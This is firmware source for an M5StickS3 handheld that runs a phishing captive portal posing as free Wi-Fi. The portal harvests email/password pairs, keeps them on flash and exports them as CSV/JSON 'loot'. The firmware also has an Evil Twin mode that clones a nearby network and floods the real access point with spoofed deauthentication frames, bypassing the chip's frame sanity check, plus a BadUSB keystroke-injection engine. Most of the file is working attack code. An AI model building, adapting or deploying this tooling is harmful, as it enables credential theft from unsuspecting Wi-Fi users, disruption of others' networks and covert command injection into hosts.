#include <M5Unified.h>   // M5StickS3 (ESP32-S3): unified driver (pulls in M5GFX)
#include <WiFi.h>
#include <esp_wifi.h>    // raw 802.11 TX (esp_wifi_80211_tx) for the Evil Twin deauth
#include <DNSServer.h>
#include <WebServer.h>
#include <Preferences.h>
#include <LittleFS.h>    // persist captured credentials to the 8MB flash
#include <math.h>        // sinf/expf for the synthesized boot laugh

// ---- WiFi Duck (BadUSB) : native USB-HID keyboard on the ESP32-S3 ----
// The S3 has a native USB-OTG peripheral, so it can enumerate as a real USB
// keyboard and "type" a DuckyScript payload into the host it is plugged into,
// triggered over Wi-Fi (like Dstike / SpaceHuhn's WiFi Duck). HID is only
// available when the firmware is built in USB-OTG (TinyUSB) mode
// (USBMode=default). In the hardware-CDC build the Duck UI still works but the
// typing itself compiles to a safe no-op (DUCK_HID == 0).
#if defined(ARDUINO_USB_MODE) && ARDUINO_USB_MODE == 0
  #define DUCK_HID 1
  #include "USB.h"
  #include "USBHIDKeyboard.h"
  USBHIDKeyboard DuckKbd;
#else
  #define DUCK_HID 0
#endif


// Based on https://community.dfrobot.com/makelog-313463.html
// Modified font and text placement for StickC-Plus, further improvements added
// Ported to the M5StickS3 (ESP32-S3-PICO-1): M5Unified replaces M5StickCPlus;
//   power/battery via M5.Power (M5PM1 PMU, no AXP192); sound via M5.Speaker
//   (ES8311 codec, no passive buzzer). Display is the same 135x240 panel, so
//   the LCD layout/drawing code is unchanged. See README for hardware notes.
// Code BY: https://github.com/n0xa/
// Moded BY: https://github.com/Kuush01
// Moded BY: https://github.com/raphntc

 
// User configuration (defaults; SSID and admin login are overridable at
// runtime from the /settings page and persisted to flash)
#define SSID_NAME "Wi-Fi Gratis"
#define SUBTITLE "E-CORP service."
#define POST_TITLE "Validando Acesso..."
#define POST_BODY "Sua conta esta sendo validada. Aguarde ate 5 minutos pela conexao do dispositivo.</br>Obrigado."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"
#define ADMIN_USER_DEF "admin"      // default dashboard login user
#define ADMIN_PASS_DEF "huebr"      // default dashboard login password
#define DUCK_SSID_DEF "WiFiDuck-HUEBR"  // default WiFi Duck AP name (WPA2)
#define DUCK_PASS_DEF "quack1234"       // default WiFi Duck AP password (>=8 chars)

int capcount = 0;           // lifetime captures (shown on the LCD)
int storedCount = 0;        // entries currently held in the ring buffer
int previous = -1;          // last count drawn on screen; -1 forces the first redraw
// The M5StickS3 has NO user-addressable LED (only a hardware power/charge
// indicator), so the "LED blink on capture" feedback compiles to a safe no-op.
// If you wire an external LED to a free GPIO, set LED_PIN to it and it will be
// driven active-LOW, exactly like the C Plus port. -1 = no LED present.
#define LED_PIN (-1)

inline void ledInit()  { if (LED_PIN >= 0) { pinMode(LED_PIN, OUTPUT); digitalWrite(LED_PIN, HIGH); } }
inline void ledWrite(bool on) { if (LED_PIN >= 0) digitalWrite(LED_PIN, on ? LOW : HIGH); } // active-LOW

// Captured credentials are kept in a fixed-size ring buffer (newest overwrites
// oldest once full) so RAM use stays bounded no matter how many come in.
#define MAX_CAPTURES 50
#define CAP_FILE "/captures.log"   // full capture history on flash (LittleFS)
struct Capture { String email; String pass; unsigned long ts; };
Capture captures[MAX_CAPTURES];
int capNext = 0;            // ring write index (storedCount says how many valid)

// Non-blocking LED blink state (armed when a capture arrives)
int blinkRemaining = 0;                    // LED toggles left to perform
unsigned long lastBlink = 0;               // millis() of last toggle
const unsigned long BLINK_INTERVAL = 150;  // ms between toggles

// LCD theme (RGB565) + live status-dot state
#define RGB565(r, g, b) ((uint16_t)(((r & 0xF8) << 8) | ((g & 0xFC) << 3) | ((b) >> 3)))
// ---- Horror "blood" theme (device screens only; victim web pages stay blue) ----
#define C_BG      RGB565(14, 6, 7)        // background (near-black, warm)
#define C_ACCENT  RGB565(140, 16, 18)     // header bar (blood red)
#define C_ACCENT2 RGB565(210, 48, 44)     // bright blood accent
#define C_OK      RGB565(70, 165, 92)     // "active" dot (sickly green)
#define C_OKDIM   RGB565(26, 58, 36)     // "active" dot, off phase
#define C_MUTED   RGB565(156, 128, 128)  // labels (ashen grey)
#define C_CARD    RGB565(30, 15, 17)      // row / counter card (dark blood-grey)
#define C_COUNT   RGB565(255, 74, 58)     // victim count (blood red)
#define C_DANGER  RGB565(229, 72, 77)    // low-battery fill (red)
#define C_BONE    RGB565(226, 222, 220)  // skull bone, mid tone
#define C_BONE_HI RGB565(255, 255, 255)  // skull bone, highlight
#define C_BONE_SH RGB565(158, 150, 150)  // skull bone, shadow
#define C_BONE_SH2 RGB565(104, 96, 98)   // skull bone, deep shadow / outline
#define C_SOCKET  RGB565(8, 3, 4)        // eye sockets / nasal cavity (near black)
#define C_EYE     RGB565(255, 36, 32)    // skull eyes, bright glow
#define C_EYEDIM  RGB565(120, 14, 12)    // skull eyes, dim glow
// Depth / menu shading palette (blood)
#define C_BG2      RGB565(4, 1, 2)        // background gradient (bottom, darker)
#define C_HDR_TOP  RGB565(168, 24, 26)    // header gradient top (fresh blood)
#define C_HDR_BOT  RGB565(68, 8, 10)      // header gradient bottom (dried blood)
#define C_CARD_HI  RGB565(66, 30, 32)     // row bevel highlight (top edge)
#define C_CARD_SH  RGB565(3, 1, 2)        // drop shadow under cards / header
#define C_ACC_DK   RGB565(70, 8, 10)      // selected row, bottom of accent
#define C_ACC_HI   RGB565(224, 58, 54)    // selected row bevel / glow
// Blood drip colors
#define C_BLOOD    RGB565(150, 10, 12)    // blood body
#define C_BLOOD_DK RGB565(72, 4, 6)       // blood shadow / dried
#define C_BLOOD_HI RGB565(224, 48, 46)    // wet highlight / glint
bool dotOn = false;

// -------- App menu / state machine --------
// The device boots into a menu (Tools / Configuration / Exit) instead of
// launching the portal straight away. The portal AP + web server only come
// up when the operator chooses Tools > Start Evil Portal.
// Two selectable projects share this firmware; the main menu picks one and the
// device runs either the Evil Portal (ST_RUNNING) or the WiFi Duck
// (ST_DUCK_RUNNING) -- never both at once.
enum AppState { ST_MENU_MAIN, ST_MENU_PORTAL, ST_MENU_DUCK, ST_MENU_CONFIG, ST_MENU_SCAN, ST_RUNNING, ST_DUCK_RUNNING };
AppState appState = ST_MENU_MAIN;
int menuSel = 0;              // highlighted row in the current menu

enum Project { PROJ_PORTAL, PROJ_DUCK };
Project activeProject = PROJ_PORTAL;  // which project owns the web server right now

bool portalStarted = false;  // Evil Portal AP + web server currently up?
bool duckUp = false;         // WiFi Duck AP + web server currently up?

// Loot retrieval: tapping BtnA on the live dashboard shows an on-screen QR code
// (admin panel / loot export) so the operator can pull captures to a phone.
bool showQR = false;         // QR loot screen currently shown (instead of dashboard)
int  qrPage = 0;             // 0 = admin dashboard, 1 = CSV loot export
#define QR_PAGES 2

// Remember which submenu a blocking info/confirm screen should return to.
AppState infoReturn = ST_MENU_PORTAL;
int      infoReturnSel = 1;

// Configuration options (toggled from the Configuration menu / web settings;
// all persisted to flash via Preferences and reloaded on boot)
bool soundOn = true;             // beep when a credential is captured
bool laughOn = true;             // play the evil laugh on every new capture
bool ledBlinkOn = true;          // blink the LED when a credential is captured
uint8_t brightLevel = 2;         // screen brightness index (0..2)
const uint8_t BRIGHT_VALS[3] = {64, 160, 255};  // M5.Display.setBrightness range 0..255
uint8_t spkVol = 60;             // speaker volume 0..100 (%) -- mapped to 0..255
uint8_t screenRot = 3;           // LCD rotation (1 or 3 = landscape, flipped)

String  cfgSsid   = SSID_NAME;         // broadcast AP name (runtime-settable)
String  adminUser = ADMIN_USER_DEF;    // /admin login user
String  adminPass = ADMIN_PASS_DEF;    // /admin login password
bool    authOn    = true;              // require login to reach /admin
uint8_t autoRefresh = 15;              // dashboard auto-refresh seconds (0 = off)

String  duckSsid  = DUCK_SSID_DEF;     // WiFi Duck AP SSID (runtime-settable)
String  duckPass  = DUCK_PASS_DEF;     // WiFi Duck AP WPA2 password
bool    duckAutorun = false;           // auto-run the default payload when the Duck starts

// ---- WiFi Duck execution state (non-blocking DuckyScript interpreter) ----
String   duckScript;                   // the script text currently being run
int      duckLineStart = 0;            // parse cursor: offset of the next line
bool     duckBusy = false;             // a script is currently executing
unsigned long duckResumeAt = 0;        // millis() to resume after a DELAY
int      duckDefaultDelay = 0;         // ms inserted between commands (DEFAULTDELAY)
String   duckPrevLine;                 // last executed line (for REPEAT)
int      duckLinesDone = 0;            // lines executed so far (progress)
int      duckLinesTotal = 0;           // non-empty line count (for the UI)
String   duckStatusMsg = "Idle";       // short status shown on the LCD + web

// ---- DuckyScript 3.0-lite: DEFINE / VAR substitution (symbol table) ----
#define  DUCK_MAXVARS 12
String   duckVarName[DUCK_MAXVARS];    // token incl. prefix, e.g. "$x" or "#TARGET"
String   duckVarVal[DUCK_MAXVARS];     // its substituted value
int      duckVarCount = 0;

// ---- On-device arming (Bash Bunny-style payload slots) ----
#define  DUCK_MAXSLOTS 16
String   duckSlotName[DUCK_MAXSLOTS];  // saved payload names, in menu order
int      duckSlotCount = 0;
int      duckArmedSlot = 0;            // which saved payload BtnA fires

#define  DUCK_DIR     "/duck"           // saved payloads live here (LittleFS)
#define  DUCK_DEFAULT "/duck/payload.txt"  // the default / last-run payload

// ---- Evil Twin state (clone a scanned AP + deauth the real one) ----
// We stand up the captive portal on the *target's* SSID and channel (open), then
// flood the real AP with deauth/disassoc frames so its clients drop and roam to
// our stronger, open twin -- landing on the phishing page. Educational use only.
bool          twinActive = false;      // portal is running as an evil twin
uint8_t       twinBSSID[6] = {0};      // target AP MAC (spoofed as the deauth source)
uint8_t       twinChannel = 1;         // target channel (clone + deauth live here)
String        twinSSID;                // the SSID we clone
unsigned long twinDeauthCount = 0;     // frames sent (stats)
unsigned long lastDeauth = 0;          // deauth pacing

#define MAX_SCAN 18                    // nearby APs we keep from a scan
int      scanCount = 0;                // APs found
int      scanSel   = 0;                // highlighted entry (+ Rescan / + Back virtual rows)
int      scanTop   = 0;                // first visible row (the list scrolls)
String   scanSsid[MAX_SCAN];
uint8_t  scanBssid[MAX_SCAN][6];
uint8_t  scanCh[MAX_SCAN];
int8_t   scanRssi[MAX_SCAN];
bool     scanEnc[MAX_SCAN];            // encrypted? (shown as a lock marker)

// The ESP32 core normally refuses to transmit frames whose source MAC isn't its
// own. Overriding this (weak) sanity check lets us inject spoofed deauth frames.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

// 802.11 deauth/disassoc template: broadcast dst, src + bssid patched to target.
static uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,              // frame control (deauth) + duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // dst = broadcast (hit every client)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // src = target BSSID (patched at runtime)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID = target BSSID (patched at runtime)
  0x00, 0x00,                          // sequence
  0x07, 0x00                           // reason 7: class-3 frame from nonassociated STA
};

// Blast a short burst of spoofed deauth + disassoc frames at the target AP.
void sendDeauthBurst() {
  if (!twinActive) return;
  static uint16_t seq = 0;
  static const uint8_t reasons[] = { 1, 7, 4 };   // some clients honor only certain codes
  memcpy(deauthFrame + 10, twinBSSID, 6);
  memcpy(deauthFrame + 16, twinBSSID, 6);
  for (int i = 0; i < 6; i++) {
    // Fresh sequence number each frame so APs/clients don't dedupe the burst.
    seq++;
    deauthFrame[22] = (uint8_t)(seq << 4);
    deauthFrame[23] = (uint8_t)(seq >> 4);
    deauthFrame[24] = reasons[i % 3];             // rotate the reason code
    deauthFrame[25] = 0x00;
    deauthFrame[0] = 0xC0;                        // deauthentication
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    deauthFrame[0] = 0xA0;                        // disassociation
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    twinDeauthCount += 2;
  }
}

Preferences prefs;                     // NVS-backed settings store
 
// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway
 
unsigned long lastTick = 0;
DNSServer dnsServer; WebServer webServer(80);
 
String input(String argName) {
  String a = webServer.arg(argName);
  a = a.substring(0, 200);  // actually limit length (substring returns a copy)
  a.replace("&", "&amp;");  // escape & first so later entities aren't double-escaped
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.replace("\"", "&quot;");
  return a;
}

// Format a millis() value as H:MM:SS (used for "captured at" and uptime).
String fmtUptime(unsigned long ms) {
  unsigned long s = ms / 1000;
  char buf[16];
  snprintf(buf, sizeof(buf), "%lu:%02lu:%02lu", s / 3600, (s % 3600) / 60, s % 60);
  return String(buf);
}

// -------- Capture ring buffer --------

// Replace tab/newline so each field stays on a single flash log line.
static String sanitizeField(String s) {
  s.replace("\t", " ");
  s.replace("\r", " ");
  s.replace("\n", " ");
  return s;
}

// Persist the lifetime counter to NVS so it survives a reboot / dead battery.
void saveLifetime() {
  prefs.begin("portal", false);
  prefs.putInt("lifetime", capcount);
  prefs.end();
}

// Append one capture to the flash history file (append-only log on LittleFS).
void persistCapture(const String &email, const String &pass, unsigned long ts) {
  File f = LittleFS.open(CAP_FILE, FILE_APPEND);
  if (!f) return;  // out of space / FS error: carry on RAM-only
  f.print(ts); f.print('\t');
  f.print(sanitizeField(email)); f.print('\t');
  f.print(sanitizeField(pass)); f.print('\n');
  f.close();
}

// Store one capture: RAM ring (newest 50, for the live LCD + dashboard) AND the
// flash history file (everything, survives power loss). Bumps the counters.
void addCapture(const String &email, const String &pass) {
  unsigned long ts = millis();
  captures[capNext].email = email;
  captures[capNext].pass  = pass;
  captures[capNext].ts    = ts;
  capNext = (capNext + 1) % MAX_CAPTURES;
  if (storedCount < MAX_CAPTURES) storedCount++;
  capcount++;
  persistCapture(email, pass, ts);  // keep the full history on flash
  saveLifetime();                   // keep the lifetime count across reboots
}

// Ring index of the i-th newest entry (0 = most recent).
int capIdx(int i) {
  return (capNext - 1 - i + MAX_CAPTURES * 2) % MAX_CAPTURES;
}

// Count distinct (case-insensitive) e-mail addresses currently stored.
int uniqueEmails() {
  int u = 0;
  for (int i = 0; i < storedCount; i++) {
    String a = captures[capIdx(i)].email; a.toLowerCase();
    bool seen = false;
    for (int j = 0; j < i; j++) {
      String b = captures[capIdx(j)].email; b.toLowerCase();
      if (a == b) { seen = true; break; }
    }
    if (!seen) u++;
  }
  return u;
}

// Wipe all stored captures: the RAM ring AND the flash history file. Keeps the
// lifetime counter unless asked to reset it.
void clearCaptures(bool resetLifetime) {
  for (int i = 0; i < MAX_CAPTURES; i++) { captures[i].email = ""; captures[i].pass = ""; captures[i].ts = 0; }
  storedCount = 0;
  capNext = 0;
  LittleFS.remove(CAP_FILE);                       // drop the persisted history too
  if (resetLifetime) { capcount = 0; saveLifetime(); }
}

// Reload the newest captures from the flash history file into the RAM ring on
// boot, so a reboot / dead battery doesn't lose what was collected. The ring
// keeps only the newest MAX_CAPTURES for the live view; the full history stays
// in the file and is what the CSV/JSON exports stream.
void loadCapturesFromFlash() {
  storedCount = 0;
  capNext = 0;
  File f = LittleFS.open(CAP_FILE, FILE_READ);
  if (!f) return;
  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.length() == 0) continue;
    int t1 = line.indexOf('\t');
    int t2 = line.indexOf('\t', t1 + 1);
    if (t1 < 0 || t2 < 0) continue;
    captures[capNext].ts    = strtoul(line.substring(0, t1).c_str(), NULL, 10);
    captures[capNext].email = line.substring(t1 + 1, t2);
    captures[capNext].pass  = line.substring(t2 + 1);
    capNext = (capNext + 1) % MAX_CAPTURES;   // wraps: keeps the newest 50
    if (storedCount < MAX_CAPTURES) storedCount++;
  }
  f.close();
}

// -------- Settings persistence (NVS) --------

void loadSettings() {
  prefs.begin("portal", true);  // read-only
  soundOn     = prefs.getBool("beep", true);
  laughOn     = prefs.getBool("laugh", true);
  ledBlinkOn  = prefs.getBool("led", true);
  brightLevel = prefs.getUChar("bright", 2);
  screenRot   = prefs.getUChar("rot", 3);
  cfgSsid     = prefs.getString("ssid", SSID_NAME);
  adminUser   = prefs.getString("auser", ADMIN_USER_DEF);
  adminPass   = prefs.getString("apass", ADMIN_PASS_DEF);
  authOn      = prefs.getBool("auth", true);
  autoRefresh = prefs.getUChar("refresh", 15);
  spkVol      = prefs.getUChar("vol", 60);
  duckSsid    = prefs.getString("dssid", DUCK_SSID_DEF);
  duckPass    = prefs.getString("dpass", DUCK_PASS_DEF);
  duckAutorun = prefs.getBool("dauto", false);
  capcount    = prefs.getInt("lifetime", 0);  // lifetime count, restored across reboots
  prefs.end();
  if (spkVol > 100) spkVol = 100;
  if (duckSsid.length() == 0) duckSsid = DUCK_SSID_DEF;
  if (duckPass.length() < 8)  duckPass = DUCK_PASS_DEF;   // WPA2 needs >=8 chars
  if (brightLevel > 2) brightLevel = 2;
  if (screenRot != 1 && screenRot != 3) screenRot = 3;
  if (autoRefresh > 120) autoRefresh = 120;
  if (cfgSsid.length() == 0) cfgSsid = SSID_NAME;
  if (adminUser.length() == 0) adminUser = ADMIN_USER_DEF;
}

void saveSettings() {
  prefs.begin("portal", false);  // read-write
  prefs.putBool("beep", soundOn);
  prefs.putBool("laugh", laughOn);
  prefs.putBool("led", ledBlinkOn);
  prefs.putUChar("bright", brightLevel);
  prefs.putUChar("vol", spkVol);
  prefs.putUChar("rot", screenRot);
  prefs.putString("ssid", cfgSsid);
  prefs.putString("auser", adminUser);
  prefs.putString("apass", adminPass);
  prefs.putBool("auth", authOn);
  prefs.putUChar("refresh", autoRefresh);
  prefs.putString("dssid", duckSsid);
  prefs.putString("dpass", duckPass);
  prefs.putBool("dauto", duckAutorun);
  prefs.end();
}

// -------- Web helpers --------

// Gate the operator-only endpoints behind HTTP Basic Auth when enabled.
bool requireAuth() {
  if (!authOn) return true;
  if (!webServer.authenticate(adminUser.c_str(), adminPass.c_str())) {
    webServer.requestAuthentication(BASIC_AUTH, "Portal Evil HUEBR", "Login required");
    return false;
  }
  return true;
}

// Escape a value for safe use inside an HTML attribute (e.g. form values).
String attrEsc(String s) {
  s.replace("&", "&amp;");
  s.replace("\"", "&quot;");
  s.replace("<", "&lt;");
  s.replace(">", "&gt;");
  return s;
}

// Escape one field for CSV (RFC-4180: wrap in quotes, double internal quotes).
String csvField(String s) {
  s.replace("\"", "\"\"");
  return "\"" + s + "\"";
}

// Escape one string for embedding in JSON.
String jsonStr(String s) {
  s.replace("\\", "\\\\");
  s.replace("\"", "\\\"");
  s.replace("\n", "\\n");
  s.replace("\r", "");
  return "\"" + s + "\"";
}

// Stream the FULL capture history (from the flash file, oldest first) as CSV.
// Streamed chunk-by-chunk so a large history never has to fit in RAM at once.
void sendCsvExport() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.sendHeader("Content-Disposition", "attachment; filename=captures.csv");
  webServer.send(HTTP_CODE, "text/csv", "");
  webServer.sendContent("index,email,password,uptime,ms\r\n");
  File f = LittleFS.open(CAP_FILE, FILE_READ);
  if (f) {
    int idx = 0;
    while (f.available()) {
      String line = f.readStringUntil('\n');
      line.trim();
      if (line.length() == 0) continue;
      int t1 = line.indexOf('\t');
      int t2 = line.indexOf('\t', t1 + 1);
      if (t1 < 0 || t2 < 0) continue;
      String ts = line.substring(0, t1);
      String email = line.substring(t1 + 1, t2);
      String pass = line.substring(t2 + 1);
      idx++;
      webServer.sendContent(String(idx) + "," + csvField(email) + "," + csvField(pass) +
        "," + csvField(fmtUptime(strtoul(ts.c_str(), NULL, 10))) + "," + ts + "\r\n");
    }
    f.close();
  }
  webServer.sendContent("");  // terminate the chunked response
}

// Stream the FULL capture history (from the flash file, oldest first) as JSON.
void sendJsonExport() {
  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
  webServer.sendHeader("Content-Disposition", "attachment; filename=captures.json");
  webServer.send(HTTP_CODE, "application/json", "");
  webServer.sendContent("{\"ssid\":" + jsonStr(cfgSsid) +
    ",\"stored\":" + String(storedCount) +
    ",\"lifetime\":" + String(capcount) +
    ",\"uptime_ms\":" + String(millis()) +
    ",\"captures\":[");
  File f = LittleFS.open(CAP_FILE, FILE_READ);
  bool first = true;
  if (f) {
    while (f.available()) {
      String line = f.readStringUntil('\n');
      line.trim();
      if (line.length() == 0) continue;
      int t1 = line.indexOf('\t');
      int t2 = line.indexOf('\t', t1 + 1);
      if (t1 < 0 || t2 < 0) continue;
      String ts = line.substring(0, t1);
      String email = line.substring(t1 + 1, t2);
      String pass = line.substring(t2 + 1);
      webServer.sendContent(String(first ? "" : ",") +
        "{\"email\":" + jsonStr(email) + ",\"password\":" + jsonStr(pass) +
        ",\"ms\":" + ts + "}");
      first = false;
    }
    f.close();
  }
  webServer.sendContent("]}");
}

String footer() {
  return
    "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}
 
String header(String t) {
  String a = cfgSsid;
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}
 
// Operator dashboard served at /creds. Self-contained dark-theme page:
// stat tiles, a table of captures (newest first), and action buttons.
String creds() {
  String css =
    ":root{--bg:#0d0708;--card:#1a1012;--line:#3a1c1e;--txt:#e9e2e2;--mut:#b09a9a;--accent:#c01818;--danger:#e5484d}"
    "*{box-sizing:border-box}"
    "body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.5}"
    ".top{background:linear-gradient(90deg,#3a0607,#b11212);padding:18px 20px;position:relative;border-bottom:3px solid #6e0a0a}"
    ".top::after{content:'';position:absolute;left:0;right:0;top:100%;height:16px;z-index:5;background:radial-gradient(10px 15px at 14px 0,#9e0f0f 58%,transparent 60%) repeat-x;background-size:46px 16px}"
    ".top h1{margin:0;font-size:20px;letter-spacing:.3px}"
    ".top p{margin:3px 0 0;color:#f0c9c9;font-size:13px}"
    ".wrap{max-width:900px;margin:0 auto;padding:16px}"
    ".stats{display:flex;gap:12px;flex-wrap:wrap;margin:16px 0}"
    ".tile{flex:1;min-width:140px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px}"
    ".tile .k{color:var(--mut);font-size:12px;text-transform:uppercase;letter-spacing:.5px}"
    ".tile .v{font-size:26px;font-weight:700;margin-top:4px}"
    ".tile .v.accent{color:#ff8a8a}"
    ".bar{display:flex;gap:10px;flex-wrap:wrap;margin:8px 0 16px}"
    ".btn{display:inline-block;padding:9px 14px;border-radius:10px;border:1px solid var(--line);background:var(--card);color:var(--txt);text-decoration:none;font-size:14px;cursor:pointer}"
    ".btn:hover{border-color:var(--accent)}"
    ".btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}"
    ".btn.danger{background:transparent;border-color:var(--danger);color:#ff9a9d}"
    ".btn.danger:hover{background:var(--danger);color:#fff}"
    "table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden}"
    "thead th{background:#10131a;color:var(--mut);text-align:left;font-size:12px;text-transform:uppercase;letter-spacing:.5px;padding:10px 12px;border-bottom:1px solid var(--line)}"
    "tbody td{padding:11px 12px;border-bottom:1px solid var(--line);vertical-align:top;word-break:break-word}"
    "tbody tr:last-child td{border-bottom:none}"
    "tbody tr:nth-child(even){background:rgba(255,255,255,.02)}"
    ".idx{color:var(--mut);width:42px}"
    ".pass code{background:#0c0f14;border:1px solid var(--line);border-radius:6px;padding:2px 6px;color:#7ee2b8;font-family:ui-monospace,Menlo,Consolas,monospace}"
    ".time{color:var(--mut);white-space:nowrap}"
    ".empty{background:var(--card);border:1px dashed var(--line);border-radius:12px;padding:44px 20px;text-align:center;color:var(--mut)}"
    ".note{color:var(--mut);font-size:12px;margin:14px 0 30px;text-align:center}";

  // Build the capture table (newest first) from the ring buffer, with a
  // client-side text filter.
  String body;
  if (storedCount == 0) {
    body = "<div class=\"empty\">No credentials captured yet.<br>They will appear here as devices submit the portal form.</div>";
  } else {
    String rows;
    for (int i = 0; i < storedCount; i++) {
      Capture &c = captures[capIdx(i)];
      rows += "<tr><td class=\"idx\">" + String(storedCount - i) + "</td>"
              "<td>" + c.email + "</td>"
              "<td class=\"pass\"><code>" + c.pass + "</code></td>"
              "<td class=\"time\">" + fmtUptime(c.ts) + "</td></tr>";
    }
    body = "<input id=\"f\" class=\"filter\" placeholder=\"Filter by email or password...\" oninput=\"flt()\">"
           "<table id=\"t\"><thead><tr><th class=\"idx\">#</th><th>Email</th><th>Password</th>"
           "<th class=\"time\">Captured (uptime)</th></tr></thead><tbody>" + rows + "</tbody></table>"
           "<script>function flt(){var q=document.getElementById('f').value.toLowerCase();"
           "document.querySelectorAll('#t tbody tr').forEach(function(x){"
           "x.style.display=x.innerText.toLowerCase().indexOf(q)<0?'none':'';});}</script>";
  }

  String refreshMeta = autoRefresh > 0
    ? "<meta http-equiv=\"refresh\" content=\"" + String(autoRefresh) + "\">" : "";
  String refreshNote = autoRefresh > 0
    ? "Auto-refreshes every " + String(autoRefresh) + " s." : "Auto-refresh off.";
  int clients = WiFi.softAPgetStationNum();

  return
    "<!DOCTYPE html><html lang=\"en\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    + refreshMeta +
    "<title>" + attrEsc(cfgSsid) + " :: " + PASS_TITLE + "</title>"
    "<style>" + css +
    ".apinfo{display:flex;flex-wrap:wrap;gap:8px 22px;background:var(--card);border:1px solid var(--line);"
    "border-radius:12px;padding:12px 16px;margin:0 0 16px;font-size:13px;color:var(--mut)}"
    ".apinfo b{color:var(--txt);font-weight:600}"
    ".filter{width:100%;padding:10px 12px;margin:0 0 12px;border-radius:10px;border:1px solid var(--line);"
    "background:var(--card);color:var(--txt);font-size:14px}"
    "</style></head><body>"
    "<div class=\"top\"><h1>Portal Evil HUEBR</h1><p>Operator dashboard</p></div>"
    "<div class=\"wrap\">"
    "<div class=\"stats\">"
    "<div class=\"tile\"><div class=\"k\">Stored</div><div class=\"v accent\">" + String(storedCount) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Lifetime</div><div class=\"v\">" + String(capcount) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Unique emails</div><div class=\"v\">" + String(uniqueEmails()) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Clients online</div><div class=\"v\">" + String(clients) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Uptime</div><div class=\"v\">" + fmtUptime(millis()) + "</div></div>"
    "<div class=\"tile\"><div class=\"k\">Free heap</div><div class=\"v\">" + String(ESP.getFreeHeap() / 1024) + " KB</div></div>"
    "</div>"
    "<div class=\"apinfo\">"
    "<span>SSID <b>" + attrEsc(cfgSsid) + "</b></span>"
    "<span>Gateway <b>" + APIP.toString() + "</b></span>"
    "<span>Channel <b>" + String(WiFi.channel()) + "</b></span>"
    "<span>AP MAC <b>" + WiFi.softAPmacAddress() + "</b></span>"
    "<span>Buffer <b>" + String(storedCount) + "/" + String(MAX_CAPTURES) + "</b></span>"
    "</div>"
    "<div class=\"bar\">"
    "<a class=\"btn primary\" href=\"/admin\">&#8635; Refresh</a>"
    "<a class=\"btn\" href=\"/settings\">&#9881;&#65039; Settings</a>"
    "<a class=\"btn\" href=\"/export.csv\">&#8681; CSV</a>"
    "<a class=\"btn\" href=\"/export.json\">&#8681; JSON</a>"
    "<a class=\"btn danger\" href=\"/clear\" onclick=\"return confirm('Clear all captured credentials? This cannot be undone.')\">Clear all</a>"
    "<a class=\"btn\" href=\"/\">Portal</a>"
    "</div>"
    + body +
    "<p class=\"note\">Live table shows the newest " + String(MAX_CAPTURES) + " (RAM). The full history is saved to flash and survives reboots &mdash; download everything via CSV / JSON. " + refreshNote + "</p>"
    "</div></body></html>";
}

// -------- Settings page (/settings) --------

// Render the web configuration form with the current values filled in.
// `saved` highlights that a POST just applied.
String settingsPage(bool saved) {
  String css =
    ":root{--bg:#0d0708;--card:#1a1012;--line:#3a1c1e;--txt:#e9e2e2;--mut:#b09a9a;--accent:#c01818;--ok:#30a36c}"
    "*{box-sizing:border-box}"
    "body{margin:0;background:var(--bg);color:var(--txt);font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;line-height:1.5}"
    ".top{background:linear-gradient(90deg,#3a0607,#b11212);padding:18px 20px;position:relative;border-bottom:3px solid #6e0a0a}"
    ".top::after{content:'';position:absolute;left:0;right:0;top:100%;height:16px;z-index:5;background:radial-gradient(10px 15px at 14px 0,#9e0f0f 58%,transparent 60%) repeat-x;background-size:46px 16px}"
    ".top h1{margin:0;font-size:20px}.top p{margin:3px 0 0;color:#f0c9c9;font-size:13px}"
    ".wrap{max-width:680px;margin:0 auto;padding:16px}"
    ".card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px;margin:0 0 16px}"
